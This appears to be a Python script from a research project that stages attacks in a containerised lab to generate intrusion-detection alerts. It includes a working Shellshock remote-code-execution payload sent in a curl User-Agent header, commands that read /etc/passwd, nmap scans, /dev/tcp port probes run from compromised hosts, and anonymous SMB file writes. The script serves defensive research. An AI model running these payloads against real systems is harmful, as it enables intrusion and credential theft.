"""
Execute a pivot-focused attack where the pivot is not server_ssh.

This script is intended for recovery-priority experiments. It creates two
alternate pivot scenarios:

- server_shellshock: compromise 10.0.2.13 with Shellshock RCE, then generate
  follow-on post-exploit traffic from 10.0.2.13 to other servers.
- server_samba: perform SMB enumeration/write against 10.0.2.12, then simulate
  post-exploit command execution from server_samba to generate pivot traffic.

The server_samba path is explicitly a simulated post-exploit pivot. The current
digital twin demonstrates anonymous SMB access and file write; it does not
currently include a complete Samba RCE exploit chain in this script.
"""

from __future__ import annotations

import argparse
import logging
import shlex
import sys
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parent
SRC = ROOT / "src"
if str(SRC) not in sys.path:
    sys.path.insert(0, str(SRC))

from llm_ir_dt.docker_manager.docker_manager import DockerManager


logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)8s] %(message)s "
    "(%(filename)s:%(lineno)s)",
)
logger = logging.getLogger(__name__)

CLIENT = "client"
SERVER_SSH = "10.0.2.11"
SERVER_SAMBA = "10.0.2.12"
SERVER_SHELLSHOCK = "10.0.2.13"
SERVER_WEB1 = "10.0.2.14"
SERVER_WEB2 = "10.0.2.15"


def run_in(container: str, command: str) -> str:
    """Execute a shell command in one digital-twin container."""
    result = DockerManager.exec_run(container, command)
    logger.info("[%s exit=%s] %s", container, result["exit_code"], command)
    output = str(result.get("output", "")).strip()
    if output:
        logger.info("Output:\n%s", output)
    return output


def run_client(command: str) -> str:
    """Execute a command from the attacker/client container."""
    return run_in(CLIENT, command)


def run_shellshock(command: str) -> str:
    """Execute a command on server_shellshock through the Shellshock RCE."""
    header = shlex.quote(f"User-Agent: () {{ :;}}; echo; {command}")
    return run_client(
        f"curl -s -H {header} "
        f"http://{SERVER_SHELLSHOCK}/cgi-bin/vulnerable 2>&1 || true"
    )


def tcp_probe_command(target: str, ports: tuple[int, ...], repeats: int = 1) -> str:
    """Build a bash /dev/tcp probe command for pivot traffic generation."""
    ports_arg = " ".join(str(port) for port in ports)
    repeat_arg = " ".join(str(idx) for idx in range(1, repeats + 1))
    return (
        f"for i in {repeat_arg}; do "
        f"for p in {ports_arg}; do "
        "timeout 1 bash -c "
        f"'cat < /dev/null > /dev/tcp/{target}/'$p "
        f"&& echo {target}:$p open || echo {target}:$p closed; "
        "done; "
        "done"
    )


def run_reconnaissance() -> None:
    """Generate baseline discovery and scan traffic from the client."""
    logger.info("=== Alt-Pivot Stage 1: Client host discovery ===")
    for target in (
        SERVER_SSH,
        SERVER_SAMBA,
        SERVER_SHELLSHOCK,
        SERVER_WEB1,
        SERVER_WEB2,
    ):
        run_client(f"ping -c 2 -W 1 {target}")
        time.sleep(0.2)

    logger.info("=== Alt-Pivot Stage 2: Client service scan ===")
    run_client(
        "nmap -sT -Pn -p 22,80,139,445 "
        f"{SERVER_SSH} {SERVER_SAMBA} {SERVER_SHELLSHOCK} "
        f"{SERVER_WEB1} {SERVER_WEB2}"
    )


def run_shellshock_pivot() -> None:
    """Compromise server_shellshock and pivot from 10.0.2.13."""
    logger.info("=== Alt-Pivot Stage 3: Shellshock RCE on server_shellshock ===")
    run_shellshock("/usr/bin/id; /bin/hostname; /bin/cat /etc/passwd")
    run_shellshock("ip addr; ip route; ps aux | head -n 12")

    logger.info(
        "=== Alt-Pivot Stage 4: Post-exploit pivot traffic "
        "from server_shellshock ==="
    )
    logger.info(
        "Shellshock RCE was triggered above. The following commands are "
        "executed directly inside server_shellshock to model attacker "
        "post-exploitation activity and make 10.0.2.13 visible as the "
        "source of pivot traffic in IDS alerts."
    )
    run_in("server_shellshock", "id; hostname; ip addr; ip route")
    run_in(
        "server_shellshock",
        f"wget -qO- http://{SERVER_WEB1}/ | head -n 5; "
        f"wget -qO- http://{SERVER_WEB2}/ | head -n 5",
    )
    run_in("server_shellshock", tcp_probe_command(SERVER_SSH, (22,), repeats=6))
    run_in(
        "server_shellshock",
        tcp_probe_command(SERVER_SAMBA, (139, 445), repeats=3),
    )
    run_in("server_shellshock", tcp_probe_command(SERVER_WEB1, (80,), repeats=3))
    run_in("server_shellshock", tcp_probe_command(SERVER_WEB2, (80,), repeats=3))

    logger.info(
        "=== Alt-Pivot Stage 5: Direct comparison probes from client ==="
    )
    run_client(f"smbclient -L //{SERVER_SAMBA} -N 2>&1 || true")
    run_client(
        f"smbclient //{SERVER_SAMBA}/share -N "
        "-c 'pwd; ls; put /etc/hostname observed_share_file.txt; ls' "
        "2>&1 || true"
    )


def run_samba_pivot() -> None:
    """Attack server_samba, then simulate pivot traffic from 10.0.2.12."""
    logger.info("=== Alt-Pivot Stage 3: SMB access on server_samba ===")
    run_client(f"smbclient -L //{SERVER_SAMBA} -N 2>&1 || true")
    run_client(
        f"smbclient //{SERVER_SAMBA}/share -N "
        "-c 'pwd; ls; put /etc/hostname samba_pivot_payload.txt; ls' "
        "2>&1 || true"
    )

    logger.info(
        "=== Alt-Pivot Stage 4: Simulated post-exploit pivot "
        "from server_samba ==="
    )
    run_in("server_samba", "id; hostname; ip addr; ip route")
    run_in("server_samba", tcp_probe_command(SERVER_SSH, (22,), repeats=6))
    run_in("server_samba", tcp_probe_command(SERVER_SHELLSHOCK, (80,), repeats=4))
    run_in("server_samba", tcp_probe_command(SERVER_WEB1, (80,), repeats=3))
    run_in("server_samba", tcp_probe_command(SERVER_WEB2, (80,), repeats=3))

    logger.info(
        "=== Alt-Pivot Stage 5: Direct comparison Shellshock probe "
        "from client ==="
    )
    run_shellshock("/usr/bin/id; /bin/hostname")


def print_alerts() -> None:
    """Read and print Snort alerts from the gateway."""
    logger.info("=== Alt-pivot attack complete. Reading alerts... ===")
    time.sleep(3)
    alerts = DockerManager.read_alerts()
    logger.info("Total alerts: %d", len(alerts["alerts"]))
    for alert in alerts["alerts"]:
        logger.info(
            "Alert: [pri=%s cls=%s] {%s} %s -> %s %s",
            alert.get("priority", "-"),
            alert.get("classification", "-"),
            alert.get("protocol", "-"),
            alert.get("source", "-"),
            alert.get("destination", "-"),
            alert.get("message", alert["raw"]),
        )


def parse_args() -> argparse.Namespace:
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser(
        description="Run an alternate-pivot digital-twin attack."
    )
    parser.add_argument(
        "--pivot",
        choices=("server_shellshock", "server_samba"),
        default="server_shellshock",
        help=(
            "Compromised server used as the pivot. server_samba is a "
            "simulated post-exploit pivot."
        ),
    )
    return parser.parse_args()


def main() -> None:
    """Run the selected alternate-pivot scenario."""
    args = parse_args()
    run_reconnaissance()
    if args.pivot == "server_shellshock":
        run_shellshock_pivot()
    else:
        run_samba_pivot()
    print_alerts()


if __name__ == "__main__":
    main()
